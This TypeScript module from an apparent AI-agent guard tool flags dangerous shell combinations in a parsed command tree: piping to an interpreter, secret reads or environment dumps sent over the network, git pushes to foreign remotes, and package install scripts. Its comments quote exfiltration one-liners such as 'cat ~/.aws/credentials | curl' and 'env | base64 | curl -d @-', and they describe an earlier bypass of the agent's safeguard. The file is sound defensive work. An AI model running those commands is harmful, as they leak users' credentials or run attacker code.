/**
 * Dangerous-shell-combination classifier (R1-005 fix).
 *
 * `classifyToolEvent` in `@patchwork/core/sinks` matches sinks against
 * resolved paths and URLs in a `ToolEvent` — it doesn't consume the
 * parsed shell tree, so a high-confidence `curl https://attacker | sh`
 * parses cleanly but never trips the keystone (which requires
 * non-`high` confidence) and never trips a sink (because no resolved
 * path matches a persistence pattern). R1 flagged this as a HIGH
 * bypass: dangerous indicator combinations should be first-class sink
 * matches, not only keystone cases.
 *
 * This module walks the parsed tree and emits `SinkMatch[]` for the
 * combinations design §3.2 / GPT round-4 called out:
 *
 *   - pipe_to_interpreter         → SinkClass `pipe_to_shell`
 *   - process_sub_to_interpreter  → SinkClass `pipe_to_shell`
 *   - fetch_tool + interpreter_inline_eval
 *                                 → SinkClass `interpreter_eval_with_network`
 *   - secret_path read + any egress (fetch_tool / nc_socat / scp_rsync /
 *     gh_upload / network_redirect)
 *                                 → SinkClass `direct_secret_to_network`
 *   - git_remote_mutate           → SinkClass `pipe_to_shell`  (closest
 *                                   class today — a git push to an
 *                                   attacker remote IS exfil; commit 9
 *                                   may introduce a dedicated class)
 *   - package_lifecycle           → SinkClass `package_lifecycle`
 *
 * Severity:
 *   - `deny` under active (or fail-closed `null`) taint
 *   - `approval_required` otherwise
 *
 * The adapter merges these matches with the ones from
 * `classifyToolEvent` before calling `decidePreToolUse`. The composer's
 * existing first-match-wins order then drives the verdict.
 */

import type { SinkMatch, SinkClass } from "@patchwork/core";
import type {
	ShellParsedCommand,
	SinkIndicator,
	SinkIndicatorKind,
} from "@patchwork/core";

interface CollectedIndicators {
	all: SinkIndicator[];
	kinds: Set<SinkIndicatorKind>;
}

/** Walk the tree and bucket every indicator. */
function collect(root: ShellParsedCommand): CollectedIndicators {
	const all: SinkIndicator[] = [];
	const kinds = new Set<SinkIndicatorKind>();
	const stack: ShellParsedCommand[] = [root];
	while (stack.length > 0) {
		const node = stack.pop() as ShellParsedCommand;
		for (const ind of node.sink_indicators) {
			all.push(ind);
			kinds.add(ind.kind);
		}
		if (node.children) {
			for (const child of node.children) stack.push(child);
		}
	}
	return { all, kinds };
}

const EGRESS_KINDS: ReadonlySet<SinkIndicatorKind> = new Set<SinkIndicatorKind>([
	"fetch_tool",
	"nc_socat",
	"scp_rsync",
	"gh_upload",
	"network_redirect",
]);

/**
 * Argv heads that dump the environment / secrets. R2-004 fix —
 * `env | base64 | curl` was a documented A2 gap until GPT-5.5 pointed
 * out that the env-dump-to-network pattern is recognizable WITHOUT
 * URL allowlisting. These argv heads represent commands whose output
 * commonly contains environment variables, secrets, or session
 * state, and whose presence in a pipeline that egresses to a network
 * sink is a direct exfiltration signal.
 *
 *   - `env` with no operand-style args = print env
 *   - `printenv` = print env
 *   - `export -p` = print exported vars
 *   - `set` with no args = print all shell vars
 *   - `declare -x` / `declare -p` = print declared vars
 *
 * We don't try to be exhaustive — the keystone catches anything we
 * miss when the parse is non-`high` and the session is tainted. This
 * is the specific high-confidence shape the v0.6.11 release-gate
 * test A2 demands.
 */
const ENV_DUMP_HEADS: ReadonlySet<string> = new Set([
	"env",
	"printenv",
	"set",
]);

/** True if `node` looks like an environment-dump invocation. */
function isEnvDump(node: ShellParsedCommand): boolean {
	const argv = node.argv;
	if (argv === "unresolved") {
		// Resolved head is the parser's best-effort first word even
		// when the rest is dynamic — check it.
		const head = node.resolved_head;
		return typeof head === "string" && ENV_DUMP_HEADS.has(head);
	}
	if (argv.length === 0) return false;
	const head = argv[0];
	if (ENV_DUMP_HEADS.has(head)) return true;
	// `export -p` and `declare -p` / `declare -x` dump too.
	if (head === "export" && argv.length === 2 && argv[1] === "-p") return true;
	if (
		head === "declare" &&
		argv.length === 2 &&
		(argv[1] === "-p" || argv[1] === "-x")
	) {
		return true;
	}
	return false;
}

function treeHasEnvDump(root: ShellParsedCommand): boolean {
	const stack: ShellParsedCommand[] = [root];
	while (stack.length > 0) {
		const node = stack.pop() as ShellParsedCommand;
		if (isEnvDump(node)) return true;
		if (node.children) {
			for (const child of node.children) stack.push(child);
		}
	}
	return false;
}

function severityFor(tainted: boolean): SinkMatch["severity"] {
	return tainted ? "deny" : "approval_required";
}

function makeMatch(
	cls: SinkClass,
	indicators: readonly SinkIndicator[],
	reasonPrefix: string,
	tainted: boolean,
): SinkMatch {
	const tokens = Array.from(
		new Set(indicators.map((i) => i.token).filter(Boolean)),
	).slice(0, 4);
	const tokenSummary = tokens.length > 0 ? ` [${tokens.join(", ")}]` : "";
	return {
		class: cls,
		severity: severityFor(tainted),
		reason: tainted
			? `${reasonPrefix} under active taint${tokenSummary} — refusing`
			: `${reasonPrefix}${tokenSummary} — approval required`,
		matched_pattern: indicators.map((i) => i.kind).sort().join("+"),
	};
}

/**
 * Classify dangerous indicator combinations on a parsed shell tree.
 * Pass `tainted=true` when the session has any active taint OR the
 * snapshot was null (fail-closed). Returns `[]` for parsed trees with
 * no dangerous combinations.
 */
export function classifyDangerousShellCombos(
	root: ShellParsedCommand,
	tainted: boolean,
): SinkMatch[] {
	const { all, kinds } = collect(root);
	const out: SinkMatch[] = [];

	// 1. Pipe/process-sub into an interpreter — `... | sh`, `bash <(curl ...)`.
	//    These are direct execution-of-fetched-content paths.
	const pipeShellInds = all.filter(
		(i) =>
			i.kind === "pipe_to_interpreter" ||
			i.kind === "process_sub_to_interpreter",
	);
	if (pipeShellInds.length > 0) {
		out.push(
			makeMatch(
				"pipe_to_shell",
				pipeShellInds,
				"Shell content piped or process-substituted into an interpreter",
				tainted,
			),
		);
	}

	// 2. Inline interpreter eval combined with network fetch on the same
	//    command tree (`curl ... && node -e "..."`, `wget | head | python -c ...`).
	if (kinds.has("interpreter_inline_eval") && kinds.has("fetch_tool")) {
		const inds = all.filter(
			(i) =>
				i.kind === "interpreter_inline_eval" || i.kind === "fetch_tool",
		);
		out.push(
			makeMatch(
				"interpreter_eval_with_network",
				inds,
				"Network fetch alongside inline interpreter eval",
				tainted,
			),
		);
	}

	// 3. Secret-path read combined with any egress on the same tree.
	//    `cat ~/.aws/credentials | curl ...`, `gh gist create ~/.ssh/id_rsa`, etc.
	if (kinds.has("secret_path")) {
		const egressKinds = [...kinds].filter((k) => EGRESS_KINDS.has(k));
		if (egressKinds.length > 0) {
			const inds = all.filter(
				(i) => i.kind === "secret_path" || EGRESS_KINDS.has(i.kind),
			);
			out.push(
				makeMatch(
					"direct_secret_to_network",
					inds,
					`Secret-class path combined with egress (${egressKinds.join(", ")})`,
					tainted,
				),
			);
		}
	}

	// 3b. Environment-dump combined with any egress on the same tree
	//     (R2-004). The canonical exfil pattern `env | base64 | curl -d @-`
	//     does NOT carry a `secret_path` indicator (`env` isn't a path)
	//     but is just as direct an exfiltration channel. Recognized
	//     dump heads: env, printenv, set (no args), export -p,
	//     declare -p/-x. See `isEnvDump`.
	if (treeHasEnvDump(root)) {
		const egressKinds = [...kinds].filter((k) => EGRESS_KINDS.has(k));
		if (egressKinds.length > 0) {
			const inds = all.filter((i) => EGRESS_KINDS.has(i.kind));
			out.push({
				class: "direct_secret_to_network",
				severity: severityFor(tainted),
				reason: tainted
					? `Environment-dump command piped to egress (${egressKinds.join(", ")}) under active taint — refusing`
					: `Environment-dump command piped to egress (${egressKinds.join(", ")}) — approval required`,
				matched_pattern: `env_dump+${egressKinds.sort().join("+")}`,
			});
		}
	}

	// 4. Git remote mutation — push / remote add / fetch with custom URL.
	//    Under taint, this is an exfil channel via legitimate-looking
	//    `git push`. No dedicated SinkClass today; reuse pipe_to_shell as
	//    the closest "executes externally-influenced data" semantic. A
	//    dedicated class lands in commit 9 alongside trust-repo-config.
	const gitInds = all.filter((i) => i.kind === "git_remote_mutate");
	if (gitInds.length > 0) {
		out.push(
			makeMatch(
				"pipe_to_shell",
				gitInds,
				"Git remote mutation (push/remote add/fetch with custom URL)",
				tainted,
			),
		);
	}

	// 5. Package-manager lifecycle — npm/pnpm/yarn/bun install with
	//    scripts enabled (commit-4's indicator already gates on
	//    --ignore-scripts).
	const pkgInds = all.filter((i) => i.kind === "package_lifecycle");
	if (pkgInds.length > 0) {
		out.push(
			makeMatch(
				"package_lifecycle",
				pkgInds,
				"Package-manager install can execute lifecycle scripts",
				tainted,
			),
		);
	}

	return out;
}
